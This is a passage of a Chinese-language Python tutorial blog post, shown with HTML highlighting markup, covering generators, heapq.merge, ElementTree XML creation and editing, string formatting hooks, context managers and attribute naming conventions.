class="keyword">in</span> flatten(items):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><p>语句<code>yield from</code>在你想在生成器中调用其他生成器作为子例程时非常有用，如果你不想在代码中使用，那么需要写额外的<code>for</code>循环，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flatten</span><span class="params">(items, ignore_types=<span class="params">(str, bytes)</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> isinstance(x, Iterable) <span class="keyword">and</span> <span class="keyword">not</span> isinstance(x, ignore_types):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> flatten(x):</span><br><span class="line">                <span class="keyword">yield</span> i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> x</span><br></pre></td></tr></table></figure><h4 id="顺序迭代合并后的排序迭代对象"><a href="#顺序迭代合并后的排序迭代对象" class="headerlink" title="顺序迭代合并后的排序迭代对象"></a>顺序迭代合并后的排序迭代对象</h4><p>如果有一系列的排序序列，想将它们合并后得到一个排序序列并在上面迭代遍历。可以使用<code>heapq.merge()</code>函数，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> heapq</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> heapq.merge(a,b):</span><br><span class="line"><span class="meta">... </span>    print(c)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure><h3 id="数据编码与处理"><a href="#数据编码与处理" class="headerlink" title="数据编码与处理"></a>数据编码与处理</h3><h4 id="将字典转换为XML"><a href="#将字典转换为XML" class="headerlink" title="将字典转换为XML"></a>将字典转换为XML</h4><p><code>xml.etree.ElementTree</code>库通常用来做解析工作，其实也可以创建<code>XML</code>文档。如下函数所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xml.etree.ElementTree <span class="keyword">import</span> Element,tostring</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dict_to_xml</span><span class="params">(tag, d)</span>:</span></span><br><span class="line">    elem = Element(tag)</span><br><span class="line">    <span class="keyword">for</span> key, val <span class="keyword">in</span> d.items():</span><br><span class="line">        child = Element(key)</span><br><span class="line">        child.text = str(val)</span><br><span class="line">        elem.append(child)</span><br><span class="line">    <span class="keyword">return</span> elem</span><br></pre></td></tr></table></figure><p>函数使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = &#123; <span class="string">'name'</span>: <span class="string">'GOOG'</span>, <span class="string">'shares'</span>: <span class="number">100</span>, <span class="string">'price'</span>:<span class="number">490.1</span> &#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = dict_to_xml(<span class="string">'stock'</span>, s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e</span><br><span class="line">&lt;Element <span class="string">'stock'</span> at <span class="number">0x1004b64c8</span>&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>转换结果是一个<code>Element</code>实例。对于<code>I/O</code>操作，使用<code>xml.etree.ElementTree</code>中的<code>tostring()</code>函数很容易就能将它转换成一个字节字符串。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> xml.etree.ElementTree <span class="keyword">import</span> tostring</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tostring(e)</span><br><span class="line"><span class="string">b'&lt;stock&gt;&lt;price&gt;490.1&lt;/price&gt;&lt;shares&gt;100&lt;/shares&gt;&lt;name&gt;GOOG&lt;/name&gt;&lt;/stock&gt;'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>如果想给某个元素添加属性值，可以使用<code>set()</code>方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.set(<span class="string">'_id'</span>,<span class="string">'1234'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tostring(e)</span><br><span class="line"><span class="string">b'&lt;stock _id="1234"&gt;&lt;price&gt;490.1&lt;/price&gt;&lt;shares&gt;100&lt;/shares&gt;&lt;name&gt;GOOG&lt;/name&gt;</span></span><br><span class="line"><span class="string">&lt;/stock&gt;'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="解析和修改XML"><a href="#解析和修改XML" class="headerlink" title="解析和修改XML"></a>解析和修改XML</h4><p>使用<code>xml.etree.ElementTree</code>模块可以完成该操作，假设有如下名为<code>pred.xml</code>的文档内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>14791<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nm</span>&gt;</span>Clark <span class="symbol">&amp;amp;</span> Balmoral<span class="tag">&lt;/<span class="name">nm</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sri</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rt</span>&gt;</span>22<span class="tag">&lt;/<span class="name">rt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">d</span>&gt;</span>North Bound<span class="tag">&lt;/<span class="name">d</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dd</span>&gt;</span>North Bound<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">sri</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cr</span>&gt;</span>22<span class="tag">&lt;/<span class="name">cr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pt</span>&gt;</span>5 MIN<span class="tag">&lt;/<span class="name">pt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fd</span>&gt;</span>Howard<span class="tag">&lt;/<span class="name">fd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v</span>&gt;</span>1378<span class="tag">&lt;/<span class="name">v</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rn</span>&gt;</span>22<span class="tag">&lt;/<span class="name">rn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pt</span>&gt;</span>15 MIN<span class="tag">&lt;/<span class="name">pt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fd</span>&gt;</span>Howard<span class="tag">&lt;/<span class="name">fd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v</span>&gt;</span>1867<span class="tag">&lt;/<span class="name">v</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rn</span>&gt;</span>22<span class="tag">&lt;/<span class="name">rn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stop</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面是一个利用<code>ElementTree</code>来读取这个文档并对它做一些修改的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> xml.etree.ElementTree <span class="keyword">import</span> parse,Element</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>doc = parse(<span class="string">'pred.xml'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = doc.getroot()</span><br><span class="line">root</span><br><span class="line">&lt;Element <span class="string">'stop'</span> at <span class="number">0x00000204D519FB30</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.remove(root.find(<span class="string">'sri'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.remove(root.find(<span class="string">'cr'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.getchildren().index(root.find(<span class="string">'nm'</span>))</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = Element(<span class="string">'spam'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.text = <span class="string">'this is a test'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root.insert(<span class="number">2</span>,e)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>doc.write(<span class="string">"newpred.xml"</span>,xml_declaration=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>新生成的<code>newpred.xml</code>文档内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='us-ascii'?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>14791<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nm</span>&gt;</span>Clark <span class="symbol">&amp;amp;</span> Balmoral<span class="tag">&lt;/<span class="name">nm</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spam</span>&gt;</span>This is a test<span class="tag">&lt;/<span class="name">spam</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pt</span>&gt;</span>5 MIN<span class="tag">&lt;/<span class="name">pt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fd</span>&gt;</span>Howard<span class="tag">&lt;/<span class="name">fd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v</span>&gt;</span>1378<span class="tag">&lt;/<span class="name">v</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rn</span>&gt;</span>22<span class="tag">&lt;/<span class="name">rn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pt</span>&gt;</span>15 MIN<span class="tag">&lt;/<span class="name">pt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fd</span>&gt;</span>Howard<span class="tag">&lt;/<span class="name">fd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">v</span>&gt;</span>1867<span class="tag">&lt;/<span class="name">v</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rn</span>&gt;</span>22<span class="tag">&lt;/<span class="name">rn</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stop</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改一个<code>XML</code>文档结构是很容易的，但是你必须牢记的是所有的修改都是针对父节点元素， 将它作为一个列表来处理。例如，如果你删除某个元素，通过调用父节点的<code>remove()</code>方法从它的直接父节点中删除。 如果你插入或增加新的元素，你同样使用父节点元素的<code>insert()</code>和<code>append()</code>方法。 还能对元素使用索引和切片操作，比如<code>element[i]</code>或<code>element[i:j]</code></p><h3 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h3><h4 id="改变对象的字符串显示"><a href="#改变对象的字符串显示" class="headerlink" title="改变对象的字符串显示"></a>改变对象的字符串显示</h4><p>要改变一个实例的字符串表示，可以重新定义它的<code>__str__()</code>和<code>__repr__()</code>方法，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pair</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Pair(&#123;0.x!r&#125;, &#123;0.y!r&#125;)'</span>.format(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(&#123;0.x!s&#125;, &#123;0.y!s&#125;)'</span>.format(self)</span><br></pre></td></tr></table></figure><p><code>__repr__()</code>方法返回一个实例的代码表示形式，通常用来重新构造这个实例。 内置的<code>repr()</code>函数返回这个字符串，跟我们使用交互式解释器显示的值是一样的。<code>__str__()</code>方法将实例转换为一个字符串，使用<code>str()</code>或<code>print()</code>函数会输出这个字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = Pair(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p</span><br><span class="line">Pair(<span class="number">3</span>, <span class="number">4</span>) <span class="comment"># __repr__() output</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(p)</span><br><span class="line">(<span class="number">3</span>, <span class="number">4</span>) <span class="comment"># __str__() output</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>上面的<code>format()</code>方法的使用看上去很有趣，格式化代码<code>{0.x}</code>对应的是第<code>1</code>个参数的<code>x</code>属性。 因此，在下面的函数中，<code>0</code>实际上指的就是<code>self</code>本身：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Pair(&#123;0.x!r&#125;, &#123;0.y!r&#125;)'</span>.format(self)</span><br></pre></td></tr></table></figure><p>作为这种实现的替代，也可以使用<code>%</code>操作符，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Pair(%r, %r)'</span> % (self.x, self.y)</span><br></pre></td></tr></table></figure><h4 id="自定义字符串的格式化"><a href="#自定义字符串的格式化" class="headerlink" title="自定义字符串的格式化"></a>自定义字符串的格式化</h4><p>为了自定义字符串的格式化，我们需要在类上面定义<code>__format__()</code>方法，实例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">_formats = &#123;</span><br><span class="line">    <span class="string">'ymd'</span> : <span class="string">'&#123;d.year&#125;-&#123;d.month&#125;-&#123;d.day&#125;'</span>,</span><br><span class="line">    <span class="string">'mdy'</span> : <span class="string">'&#123;d.month&#125;/&#123;d.day&#125;/&#123;d.year&#125;'</span>,</span><br><span class="line">    <span class="string">'dmy'</span> : <span class="string">'&#123;d.day&#125;/&#123;d.month&#125;/&#123;d.year&#125;'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Date</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, year, month, day)</span>:</span></span><br><span class="line">        self.year = year</span><br><span class="line">        self.month = month</span><br><span class="line">        self.day = day</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__format__</span><span class="params">(self, code)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">''</span>:</span><br><span class="line">            code = <span class="string">'ymd'</span></span><br><span class="line">        fmt = _formats[code]</span><br><span class="line">        <span class="keyword">return</span> fmt.format(d=self)</span><br></pre></td></tr></table></figure><p>现在<code>Date</code>类的示例可以支持格式化操作，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = Date(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">11</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(d)</span><br><span class="line"><span class="string">'2023-10-11'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(d, <span class="string">'mdy'</span>)</span><br><span class="line"><span class="string">'11/10/2023'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'The date is &#123;:ymd&#125;'</span>.format(d)</span><br><span class="line"><span class="string">'The date is 2023-10-11'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'The date is &#123;:mdy&#125;'</span>.format(d)</span><br><span class="line"><span class="string">'The date is 10/11/2023'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p><code>__format__()</code>方法给<code>Python</code>的字符串格式化功能提供了一个钩子。 这里需要着重强调的是格式化代码的解析工作完全由类自己决定。因此，格式化代码可以是任何值。 例如，参考下面来自<code>datetime</code>模块中的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = date(<span class="number">2023</span>,<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(d)</span><br><span class="line"><span class="string">'2023-10-11'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(d,<span class="string">'%A,%B,%d,%Y'</span>)</span><br><span class="line"><span class="string">'Wednesday,October,11,2023'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="让对象支持上下文管理协议"><a href="#让对象支持上下文管理协议" class="headerlink" title="让对象支持上下文管理协议"></a>让对象支持上下文管理协议</h4><p>为了让一个对象兼容<code>with</code>语句，你需要实现<code>__enter__()</code>和<code>__exit__()</code>方法。例如，考虑如下的一个类，它能为我们创建一个网络连接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> socket, AF_INET, SOCK_STREAM</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LazyConnection</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, address, family=AF_INET, type=SOCK_STREAM)</span>:</span></span><br><span class="line">        self.address = address</span><br><span class="line">        self.family = family</span><br><span class="line">        self.type = type</span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.sock <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'Already connected'</span>)</span><br><span class="line">        self.sock = socket(self.family, self.type)</span><br><span class="line">        self.sock.connect(self.address)</span><br><span class="line">        <span class="keyword">return</span> self.sock</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, exc_ty, exc_val, tb)</span>:</span></span><br><span class="line">        self.sock.close()</span><br><span class="line">        self.sock = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>这个类的关键特点在于它表示了一个网络连接，但是初始化的时候并不会做任何事情。 连接的建立和关闭是使用<code>with</code>语句自动完成的，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"></span><br><span class="line">conn = LazyConnection((<span class="string">'www.python.org'</span>, <span class="number">80</span>))</span><br><span class="line"><span class="comment"># Connection closed</span></span><br><span class="line"><span class="keyword">with</span> conn <span class="keyword">as</span> s:</span><br><span class="line">    <span class="comment"># conn.__enter__() executes: connection open</span></span><br><span class="line">    s.send(<span class="string">b'GET /index.html HTTP/1.0\r\n'</span>)</span><br><span class="line">    s.send(<span class="string">b'Host: www.python.org\r\n'</span>)</span><br><span class="line">    s.send(<span class="string">b'\r\n'</span>)</span><br><span class="line">    resp = <span class="string">b''</span>.join(iter(partial(s.recv, <span class="number">8192</span>), <span class="string">b''</span>))</span><br><span class="line">    <span class="comment"># conn.__exit__() executes: connection closed</span></span><br></pre></td></tr></table></figure><p>编写上下文管理器的主要原理是你的代码会放到<code>with</code>语句块中执行。 当出现<code>with</code>语句的时候，对象的<code>__enter__()</code>方法被触发， 它返回的值会被赋值给<code>as</code>声明的变量。然后，<code>with</code>语句块里面的代码开始执行。 最后，<code>__exit__()</code>方法被触发进行清理工作。</p><h4 id="在类中封装属性名"><a href="#在类中封装属性名" class="headerlink" title="在类中封装属性名"></a>在类中封装属性名</h4><p><code>Python</code>程序员不去依赖语言特性去封装数据，而是通过遵循一定的属性和方法命名规约来达到这个效果。 第一个约定是任何以单下划线<code>_</code>开头的名字都应该是内部实现。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._internal = <span class="number">0</span> <span class="comment"># 内部属性</span></span><br><span class="line">        self.public = <span class="number">1</span> <span class="comment"># A 公共属性</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">public_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        A public method</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_internal_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>还可能会遇到在类定义中使用两个下划线<code>(__)</code>开头的命名。比如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.__private = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__private_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">public_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        self.__private_method()</span><br></pre></td></tr></table></figure><p>使用双下划线开始会导致访问名称变成其他形式。 比如，在前面的类<code>B</code>中，私有属性会被分别重命名为<code>_B__private</code>和<code>_B__private_method</code>。 这时候你可能会问这样重命名的目的是什么，答案就是继承——这种属性通过继承是无法被覆盖的。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span><span class="params">(B)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.__private = <span class="number">1</span> <span class="comment"># Does not override B.__private</span></span><br><span 